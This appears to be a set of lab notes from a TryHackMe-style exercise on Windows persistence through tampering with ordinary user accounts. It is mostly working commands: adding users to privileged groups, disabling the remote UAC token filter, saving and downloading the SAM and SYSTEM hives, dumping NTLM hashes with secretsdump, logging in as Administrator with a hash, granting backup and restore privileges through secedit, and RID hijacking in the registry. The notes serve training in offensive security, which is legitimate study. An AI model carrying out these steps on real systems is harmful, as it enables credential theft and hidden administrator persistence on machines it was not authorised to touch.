
## Modifying unprivileged account


### Add a normal user `thmuser0` to administrator group

```
C:/> net localgroup administrators thmuser0 /add
```

### Add to Backup Operators group
- Add `Backup Operators` group, to allow them to read/write files or registry keys
	- It has following privileges assigned
	-  **SeBackupPrivilege:** The user can read any file in the system, ignoring any DACL in place.
	- **SeRestorePrivilege:** The user can write any file in the system, ignoring any DACL in place.
```
C:/> net localgroup "Backup Operators" thmuser1 /add
```

-  To RDP or WinRM back to the machine, we add user to the `Remote Desktop Users` (RDP) or `Remote Management Users` (WinRM) groups
```
C:/> net localgroup "Remote Management Users" thmuser1 /add
```

- Now connect to thmuser1 via winrm
```
$ evil-winrm -i 10.10.126.181 -u thmuser1 -p Password321
```

- When connecting remotely, user in group `Backup Operators` don't have access to all the files because of  UAC, `LocalAccountTokenFilterPolicy`, it strips any local account of its administrative privileges when logging in remotely.
- Disable token filter policy by running this command

```
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

- Now connecting back using winrm and download the SAM hashes, 
```
$ evil-winrm -i 10.10.126.181 -u thmuser1 -p Password321

*Evil-WinRM* PS C:\> reg save hklm\system system.bak
The operation completed successfully. 

*Evil-WinRM* PS C:\> reg save hklm\sam sam.bak
The operation completed successfully. 

*Evil-WinRM* PS C:\> download system.bak
Info: Download successful! 

*Evil-WinRM* PS C:\> download sam.bak
Info: Download successful!

```

- Dump password hash from the SAM and system hives:
```
$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL

Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation [*] Target system bootKey: 0x41325422ca00e6552bb6508215d8b426 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash) Administrator:500:aad3b435b51404eeaad3b435b51404ee:1cea1d7e8899f69e89088c4cb4bbdaa3::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:9657e898170eb98b25861ef9cafe5bd6::: thmuser1:1011:aad3b435b51404eeaad3b435b51404ee:e41fd391af74400faa4ff75868c93cce::: [*] Cleaning up...
```

- Use the password Hash to login as administrator
```
evil-winrm -i 10.10.126.181 -u Administrator -H 1cea1d7e8899f69e89088c4cb4bbdaa3
```

### Give privileges to normal user
- Instead of updating the group membership, we can assign privileges to the user
- Complete list of privileges: https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants 

```powershell
# Export current config
c:/> secedit /export /cfg config.inf

```

- To Assigning same privileges as Backup Operators:
- open the file and add our user to the lines in the configuration regarding the `SeBackupPrivilege` and `SeRestorePrivilege`. Line will look something like this:
```
SeBackupPrivilege = *S-1-5-32-544,*S-1-5-32-551,thmuser2
...
SeRestorePrivilege = *S-1-5-32-544,*S-1-5-32-551,thmuser2
```


-  convert the .inf file into a .sdb file which is then used to load the configuration back into the system:

```powershell
# Convert the inf file to sdb file
c:/> secedit /import /cfg config.inf /db config.sdb

# Use the sdb file to update the privileges
c:/> secedit /configure /db config.sdb /cfg config.inf
```

- The user still can't login to remote session via WinRM . One way was to add them to `Remote Management Users`, other way is to change the security descriptor associated with the WinRM service to allow thmuser2 to connect

```powershell
# open the configuration window for WinRM's security descriptor
PS c:/> Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
```

- Add the normal user in the GUI settings and select `Full controll` in the permissions section.
- Disable token filter policy by running this command

```
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

- Now connecting to back using thmuser2 will give the same privileges as `Backup Operators`

### RID Hijacking

- Change Registry keys to make OS think we are the administrators
- Relative ID (RID) is a simple numeric identifier representing the user across the system
- When a user logs on, the LSASS process gets its RID from the SAM registry hive and creates an access token associated with that RID
- We can tamper with the registry value and make windows assign an Administrator access token to an unprivileged user by associating the same RID to both accounts.
- In any Windows system, the default Administrator account is assigned the **RID = 500**, and regular users usually have **RID >= 1000**.
- use the following command to find the assigned RIDs for any user:
```
# The RID is the last bit of the SID
c:\> wmic useraccount get name,sid

Name SID
Administrator S-1-5-21-1966530601-3185510712-10604624-500
DefaultAccount S-1-5-21-1966530601-3185510712-10604624-503
Guest S-1-5-21-1966530601-3185510712-10604624-501
thmuser1 S-1-5-21-1966530601-3185510712-10604624-1008
thmuser2 S-1-5-21-1966530601-3185510712-10604624-1009
thmuser3 S-1-5-21-1966530601-3185510712-10604624-1010
```

- To assign the RID=500 to thmuser3, we need to access the SAM using Regedit.
- The SAM is restricted to the SYSTEM account only, so even the Administrator won't be able to edit it. 
- To run Regedit as SYSTEM, we will use `psexec`, it may need to be copied/downloaded if not available in the system.
```
C:\> PsExec64.exe -i -s regedit
```
- In registry editor, go to `HKLM\SAM\SAM\Domains\Account\Users\`
- All the users are identified by their RID values in hex, hence for `1010` user will be `0x352`
- Under the corresponding key, there will be a value called `F`, which holds the user's effective RID at position `0x30`:
- replace those two bytes with the RID of Administrator in hex (500 = 0x01F4), in little endian (F401)
- The next time thmuser3 logs in, LSASS will associate it with the same RID as Administrator and grant them the same privileges.
